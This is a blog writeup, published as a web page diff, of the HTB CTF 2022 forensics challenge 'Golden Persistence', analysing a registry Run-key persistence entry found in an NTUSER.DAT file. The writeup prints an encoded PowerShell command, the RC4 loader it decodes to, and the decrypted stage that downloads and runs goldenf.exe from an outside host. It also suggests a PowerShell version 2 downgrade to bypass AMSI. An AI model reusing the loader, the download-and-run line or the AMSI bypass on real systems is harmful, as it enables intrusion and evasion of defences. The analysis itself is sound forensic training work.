@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HTB CTF Golden Persistence Writeup - Jett&#39;s blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Writeup for Hack The Box CTF 2022 Forensics problem golden persistence" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="HTB CTF Golden Persistence Writeup" />
+<meta property="og:description" content="Writeup for Hack The Box CTF 2022 Forensics problem golden persistence" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/posts/golden-persistence/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-05-20T18:48:39+08:00" />
+<meta property="article:modified_time" content="2022-05-20T18:48:39+08:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="HTB CTF Golden Persistence Writeup"/>
+<meta name="twitter:description" content="Writeup for Hack The Box CTF 2022 Forensics problem golden persistence"/>
+<script src="//localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="//localhost:1313/css/fonts.b685ac6f654695232de7b82a9143a46f9e049c8e3af3a21d9737b01f4be211d1.css" rel="stylesheet">
+	
+	<script async defer data-website-id="2fb8ef9e-0de8-4211-920f-906c236ffb58" src="https://analytics.jettchen.me/umami.js"></script>
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.40ca3a860425083862b7ebd55447caec5c4384573f0cb098b8d06a91e8dace2e.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css" media="(prefers-color-scheme: dark)"  />
+	
+	
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="//localhost:1313/">Jett&#39;s blog</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/about">About</a>
+		
+		<a href="/contact">Contact</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">HTB CTF Golden Persistence Writeup</h1>
+			<div class="meta">Posted on May 20, 2022</div>
+		</div>
+		
+
+		<section class="body">
+			<h2 id="problem-description">Problem description</h2>
+<p>The challenge has a downloadable part. After extracting the zip file, we have a <code>NTUSER.DAT</code></p>
+<h2 id="prerequisites">Prerequisites</h2>
+<p><code>NTUSER.DAT</code> is a windows generated file which contains the information of the user account settings and customizations.</p>
+<p>After some research on the internet, I fond that <a href="https://github.com/keydet89/RegRipper3.0">Regripper</a> and <a href="https://ericzimmerman.github.io/#!index.md">RegistryExplorer</a> are the two useful tools of conducting forensics on <code>NTUSER.DAT</code> files.</p>
+<p>Download both of the tools from the links above onto a windows machine/vm. For Regripper, download the github repo as ZIP and decompress it.</p>
+<h2 id="solution">Solution</h2>
+<p>First, run <code>rr.exe</code> in the regripper folder to generate <code>report.txt</code></p>
+<p><img src="https://s2.loli.net/2022/05/20/A3ochvt8NxrWqRy.png" alt=""></p>
+<p>Looking through report.txt, the following chunk should stand out:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Software\Microsoft\Windows\CurrentVersion\Run
+</span></span><span style="display:flex;"><span>LastWrite Time 2022-04-11 15:22:44Z
+</span></span><span style="display:flex;"><span>  MicrosoftEdgeAutoLaunch_DD24A963A954FE25E19A66613DE0BF01 - &#34;C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe&#34; --no-startup-window --win-session-start /prefetch:5
+</span></span><span style="display:flex;"><span>  OneDrive - &#34;C:\Users\greth\AppData\Local\Microsoft\OneDrive\OneDrive.exe&#34; /background
+</span></span><span style="display:flex;"><span>  Vh0F75DQu - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc
+</span></span><span style="display:flex;"><span>  ZgB1AG4AYwB0AGkAbwBuACAAZQBuAGMAcgAgAHsACgAgACAAIAAgAHAAYQByAGEAbQAoAAoAIAAgACAAIAAgACAAIAAgAFsAQgB5AHQAZQBbAF0AXQAkAGQAYQB0AGEALAAKACAAIAAgACAAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABrAGUAeQAKACAAIAAgACAAIAAgACkACgAgAAoAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGQAYQB0AGEALgBMAGUAbgBnAHQAaAAKACAAIAAgACAAJABkAGEAdABhAC4AQwBvAHAAeQBUAG8AKAAkAGIAdQBmAGYAZQByACwAIAAwACkACgAgACAAIAAgAAoAIAAgACAAIABbAEIAeQB0AGUAWwBdAF0AJABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABCAHkAdABlAFsAXQAgADIANQA2ADsACgAgACAAIAAgAFsAQgB5AHQAZQBbAF0AXQAkAGsAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMgA1ADYAOwAKACAACgAgACAAIAAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAyADUANgA7ACAAJABpACsAKwApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAcwBbACQAaQBdACAAPQAgAFsAQgB5AHQAZQBdACQAaQA7AAoAIAAgACAAIAAgACAAIAAgACQAawBbACQAaQBdACAAPQAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwAKACAAIAAgACAAfQAKACAACgAgACAAIAAgACQAagAgAD0AIAAwADsACgAgACAAIAAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAyADUANgA7ACAAJABpACsAKwApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAagAgAD0AIAAoACQAagAgACsAIAAkAHMAWwAkAGkAXQAgACsAIAAkAGsAWwAkAGkAXQApACAAJQAgADIANQA2ADsACgAgACAAIAAgACAAIAAgACAAJAB0AGUAbQBwACAAPQAgACQAcwBbACQAaQBdADsACgAgACAAIAAgACAAIAAgACAAJABzAFsAJABpAF0AIAA9ACAAJABzAFsAJABqAF0AOwAKACAAIAAgACAAIAAgACAAIAAkAHMAWwAkAGoAXQAgAD0AIAAkAHQAZQBtAHAAOwAKACAAIAAgACAAfQAKACAACgAgACAAIAAgACQAaQAgAD0AIAAkAGoAIAA9ACAAMAA7AAoAIAAgACAAIABmAG8AcgAgACgAJAB4ACAAPQAgADAAOwAgACQAeAAgAC0AbAB0ACAAJABiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoADsAIAAkAHgAKwArACkACgAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAJABpACAAPQAgACgAJABpACAAKwAgADEAKQAgACUAIAAyADUANgA7AAoAIAAgACAAIAAgACAAIAAgACQAagAgAD0AIAAoACQAagAgACsAIAAkAHMAWwAkAGkAXQApACAAJQAgADIANQA2ADsACgAgACAAIAAgACAAIAAgACAAJAB0AGUAbQBwACAAPQAgACQAcwBbACQAaQBdADsACgAgACAAIAAgACAAIAAgACAAJABzAFsAJABpAF0AIAA9ACAAJABzAFsAJABqAF0AOwAKACAAIAAgACAAIAAgACAAIAAkAHMAWwAkAGoAXQAgAD0AIAAkAHQAZQBtAHAAOwAKACAAIAAgACAAIAAgACAAIABbAGkAbgB0AF0AJAB0ACAAPQAgACgAJABzAFsAJABpAF0AIAArACAAJABzAFsAJABqAF0AKQAgACUAIAAyADUANgA7AAoAIAAgACAAIAAgACAAIAAgACQAYgB1AGYAZgBlAHIAWwAkAHgAXQAgAD0AIAAkAGIAdQBmAGYAZQByAFsAJAB4AF0AIAAtAGIAeABvAHIAIAAkAHMAWwAkAHQAXQA7AAoAIAAgACAAIAB9AAoAIAAKACAAIAAgACAAcgBlAHQAdQByAG4AIAAkAGIAdQBmAGYAZQByAAoAfQAKAAoACgBmAHUAbgBjAHQAaQBvAG4AIABIAGUAeABUAG8AQgBpAG4AIAB7AAoAIAAgACAAIABwAGEAcgBhAG0AKAAKACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAAoAIAAgACAAIAAgACAAIAAgAFAAbwBzAGkAdABpAG8AbgA9ADAALAAgAAoAIAAgACAAIAAgACAAIAAgAE0AYQBuAGQAYQB0AG8AcgB5AD0AJAB0AHIAdQBlACwAIAAKACAAIAAgACAAIAAgACAAIABWAGEAbAB1AGUARgByAG8AbQBQAGkAcABlAGwAaQBuAGUAPQAkAHQAcgB1AGUAKQAKACAAIAAgACAAXQAgACAAIAAKACAAIAAgACAAWwBzAHQAcgBpAG4AZwBdACQAcwApAAoAIAAgACAAIAAkAHIAZQB0AHUAcgBuACAAPQAgAEAAKAApAAoAIAAgACAAIAAKACAAIAAgACAAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAcwAuAEwAZQBuAGcAdABoACAAOwAgACQAaQAgACsAPQAgADIAKQAKACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQB0AHUAcgBuACAAKwA9ACAAWwBCAHkAdABlAF0AOgA6AFAAYQByAHMAZQAoACQAcwAuAFMAdQBiAHMAdAByAGkAbgBnACgAJABpACwAIAAyACkALAAgAFsAUwB5AHMAdABlAG0ALgBHAGwAbwBiAGEAbABpAHoAYQB0AGkAbwBuAC4ATgB1AG0AYgBlAHIAUwB0AHkAbABlAHMAXQA6ADoASABlAHgATgB1AG0AYgBlAHIAKQAKACAAIAAgACAAfQAKACAAIAAgACAACgAgACAAIAAgAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJAByAGUAdAB1AHIAbgAKAH0ACgAKAFsAQgB5AHQAZQBbAF0AXQAkAGsAZQB5ACAAPQAgACQAZQBuAGMALgBHAGUAdABCAHkAdABlAHMAKAAiAFEAMABtAG0AcAByADQAQgA1AHIAdgBaAGkAMwBwAFMAIgApAAoAJABlAG4AYwByAHkAcAB0AGUAZAAxACAAPQAgACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBDAFUAOgBcAFMATwBGAFQAVwBBAFIARQBcAFoAWQBiADcAOABQADQAcwApAC4AdAAzAFIAQgBrAGEANQB0AEwACgAkAGUAbgBjAHIAeQBwAHQAZQBkADIAIAA9ACAAKABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAASABLAEMAVQA6AFwAUwBPAEYAVABXAEEAUgBFAFwAQgBqAHEAQQB0AEkAZQBuACkALgB1AEwAbAB0AGoAagBXAAoAJABlAG4AYwByAHkAcAB0AGUAZAAzACAAPQAgACgARwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBDAFUAOgBcAFMATwBGAFQAVwBBAFIARQBcAEEAcABwAEQAYQB0AGEATABvAHcAXAB0ADAAMwBBADEAUwB0AHEAKQAuAHUAWQA0AFMAMwA5AEQAYQAKACQAZQBuAGMAcgB5AHAAdABlAGQANAAgAD0AIAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIABIAEsAQwBVADoAXABTAE8ARgBUAFcAQQBSAEUAXABHAG8AbwBnAGwAZQBcAE4AdgA1ADAAegBlAEcAKQAuAEsAYgAxADkAZgB5AGgAbAAKACQAZQBuAGMAcgB5AHAAdABlAGQANQAgAD0AIAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIABIAEsAQwBVADoAXABBAHAAcABFAHYAZQBuAHQAcwBcAEoAeAA2ADYAWgBHADAATwApAC4AagBIADUANABOAFcAOABDAAoAJABlAG4AYwByAHkAcAB0AGUAZAAgAD0AIAAiACQAKAAkAGUAbgBjAHIAeQBwAHQAZQBkADEAKQAkACgAJABlAG4AYwByAHkAcAB0AGUAZAAyACkAJAAoACQAZQBuAGMAcgB5AHAAdABlAGQAMwApACQAKAAkAGUAbgBjAHIAeQBwAHQAZQBkADQAKQAkACgAJABlAG4AYwByAHkAcAB0AGUAZAA1ACkAIgAKACQAZQBuAGMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAAoAWwBCAHkAdABlAFsAXQBdACQAZABhAHQAYQAgAD0AIABIAGUAeABUAG8AQgBpAG4AIAAkAGUAbgBjAHIAeQBwAHQAZQBkAAoAJABEAGUAYwByAHkAcAB0AGUAZABCAHkAdABlAHMAIAA9ACAAZQBuAGMAcgAgACQAZABhAHQAYQAgACQAawBlAHkACgAkAEQAZQBjAHIAeQBwAHQAZQBkAFMAdAByAGkAbgBnACAAPQAgACQAZQBuAGMALgBHAGUAdABTAHQAcgBpAG4AZwAoACQARABlAGMAcgB5AHAAdABlAGQAQgB5AHQAZQBzACkACgAkAEQAZQBjAHIAeQBwAHQAZQBkAFMAdAByAGkAbgBnAHwAaQBlAHgA
+</span></span></code></pre></div><p>Decoding the part after <code>-enc</code> with base64(<a href="https://gchq.github.io/CyberChef/">cyberchef</a> is a great tool), we get a powershell script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> encr {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span>(
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">Byte[]</span>]$data,
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">Byte[]</span>]$key
+</span></span><span style="display:flex;"><span>      )
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">Byte[]</span>]$buffer = New-Object Byte[] $data.Length
+</span></span><span style="display:flex;"><span>    $data.CopyTo($buffer, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">Byte[]</span>]$s = New-Object Byte[] <span style="color:#ae81ff">256</span>;
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">Byte[]</span>]$k = New-Object Byte[] <span style="color:#ae81ff">256</span>;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i = <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">-lt</span> <span style="color:#ae81ff">256</span>; $i++)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $s[$i] = [<span style="color:#66d9ef">Byte</span>]$i;
+</span></span><span style="display:flex;"><span>        $k[$i] = $key[$i % $key.Length];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    $j = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i = <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">-lt</span> <span style="color:#ae81ff">256</span>; $i++)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $j = ($j + $s[$i] + $k[$i]) % <span style="color:#ae81ff">256</span>;
+</span></span><span style="display:flex;"><span>        $temp = $s[$i];
+</span></span><span style="display:flex;"><span>        $s[$i] = $s[$j];
+</span></span><span style="display:flex;"><span>        $s[$j] = $temp;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    $i = $j = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($x = <span style="color:#ae81ff">0</span>; $x <span style="color:#f92672">-lt</span> $buffer.Length; $x++)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $i = ($i + <span style="color:#ae81ff">1</span>) % <span style="color:#ae81ff">256</span>;
+</span></span><span style="display:flex;"><span>        $j = ($j + $s[$i]) % <span style="color:#ae81ff">256</span>;
+</span></span><span style="display:flex;"><span>        $temp = $s[$i];
+</span></span><span style="display:flex;"><span>        $s[$i] = $s[$j];
+</span></span><span style="display:flex;"><span>        $s[$j] = $temp;
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">int</span>]$t = ($s[$i] + $s[$j]) % <span style="color:#ae81ff">256</span>;
+</span></span><span style="display:flex;"><span>        $buffer[$x] = $buffer[$x] <span style="color:#f92672">-bxor</span> $s[$t];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $buffer
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> HexToBin {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span>(
+</span></span><span style="display:flex;"><span>    [Parameter(
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Position</span>=<span style="color:#ae81ff">0</span>, 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Mandatory</span>=$true, 
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ValueFromPipeline</span>=$true)
+</span></span><span style="display:flex;"><span>    ]   
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">string</span>]$s)
+</span></span><span style="display:flex;"><span>    $return = @()
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i = <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">-lt</span> $s.Length ; $i += <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        $return += [<span style="color:#66d9ef">Byte</span>]::Parse($s.Substring($i, <span style="color:#ae81ff">2</span>), [<span style="color:#66d9ef">System.Globalization.NumberStyles</span>]::HexNumber)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    Write-Output $return
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">Byte[]</span>]$key = $enc.GetBytes(<span style="color:#e6db74">&#34;Q0mmpr4B5rvZi3pS&#34;</span>)
+</span></span><span style="display:flex;"><span>$encrypted1 = (Get-ItemProperty -Path HKCU<span style="color:#960050;background-color:#1e0010">:</span>\SOFTWARE\ZYb78P4s).t3RBka5tL
+</span></span><span style="display:flex;"><span>$encrypted2 = (Get-ItemProperty -Path HKCU<span style="color:#960050;background-color:#1e0010">:</span>\SOFTWARE\BjqAtIen).uLltjjW
+</span></span><span style="display:flex;"><span>$encrypted3 = (Get-ItemProperty -Path HKCU<span style="color:#960050;background-color:#1e0010">:</span>\SOFTWARE\AppDataLow\t03A1Stq).uY4S39Da
+</span></span><span style="display:flex;"><span>$encrypted4 = (Get-ItemProperty -Path HKCU<span style="color:#960050;background-color:#1e0010">:</span>\SOFTWARE\Google\Nv50zeG).Kb19fyhl
+</span></span><span style="display:flex;"><span>$encrypted5 = (Get-ItemProperty -Path HKCU<span style="color:#960050;background-color:#1e0010">:</span>\AppEvents\Jx66ZG0O).jH54NW8C
+</span></span><span style="display:flex;"><span>$encrypted = <span style="color:#e6db74">&#34;</span>$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>$enc = [<span style="color:#66d9ef">System.Text.Encoding</span>]::ASCII
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">Byte[]</span>]$data = HexToBin $encrypted
+</span></span><span style="display:flex;"><span>$DecryptedBytes = encr $data $key
+</span></span><span style="display:flex;"><span>$DecryptedString = $enc.GetString($DecryptedBytes)
+</span></span><span style="display:flex;"><span>$DecryptedString|iex
+</span></span></code></pre></div><p>Running this script directly would cause an error, as we don&rsquo;t have access to the registry values. However, we can use RegistryExplorer to view the registry values and replace the code in powershell manually.</p>
+<p><img src="https://s2.loli.net/2022/05/20/HmNKIMAtB7iYVwd.png" alt=""></p>
+<p>The replaced powershel script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">Byte[]</span>]$key = $enc.GetBytes(<span style="color:#e6db74">&#34;Q0mmpr4B5rvZi3pS&#34;</span>)
+</span></span><span style="display:flex;"><span>$encrypted1 = <span style="color:#e6db74">&#34;F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39&#34;</span>
+</span></span><span style="display:flex;"><span>$encrypted2 = <span style="color:#e6db74">&#34;CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1&#34;</span>
+</span></span><span style="display:flex;"><span>$encrypted3=<span style="color:#e6db74">&#34;C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D&#34;</span>
+</span></span><span style="display:flex;"><span>$encrypted4=<span style="color:#e6db74">&#34;D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1&#34;</span>
+</span></span><span style="display:flex;"><span>$encrypted5 = <span style="color:#e6db74">&#34;84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$encrypted = <span style="color:#e6db74">&#34;</span>$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>$enc = [<span style="color:#66d9ef">System.Text.Encoding</span>]::ASCII
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">Byte[]</span>]$data = HexToBin $encrypted
+</span></span><span style="display:flex;"><span>$DecryptedBytes = encr $data $key
+</span></span><span style="display:flex;"><span>$DecryptedString = $enc.GetString($DecryptedBytes)
+</span></span><span style="display:flex;"><span>$DecryptedString
+</span></span></code></pre></div><p>Then, open powershell as admin, run <code>powershell -version 2</code> to bypass ASMI restrictions</p>
+<p>Finally, copy the functions from the original powershell script into powershell, then copy the modified part into the shell(separately). You should get the following result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$path =&#34;C:\ProgramData\windows\goldenf.exe&#34;;$exists = Test-Path -Path $path -PathType Leaf;if ( $exists ){Start-Process
+</span></span><span style="display:flex;"><span> $path}else{mkdir &#34;C:\ProgramData\windows&#34;;Invoke-WebRequest -Uri https://thoccarthmercenaries.edu.tho/wp-content/golde
+</span></span><span style="display:flex;"><span>nf.exe -OutFile $path;$flag=&#34;HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}&#34;;Start-Process $path}
+</span></span></code></pre></div><p>Thus, our flag is <code>HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}</code></p>
+
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/ctf-writeups">ctf-writeups</a></li>
+					
+					<li><a href="/tags/htb-ctf">htb-ctf</a></li>
+					
+					<li><a href="/tags/forensics">forensics</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<script src="https://utteranc.es/client.js"
+        	repo="JettChenT/blog"
+        	issue-term="pathname"
+        	theme="preferred-color-scheme"
+        	crossorigin="anonymous"
+        	async>
+		</script>
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/JettChenT" title="GitHub"><i data-feather="github"></i></a><a class="soc" href="https://twitter.com/jettchen5" title="Twitter"><i data-feather="twitter"></i></a></div>
+  <div class="footer-info">
+    2024  © Jett Chen |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
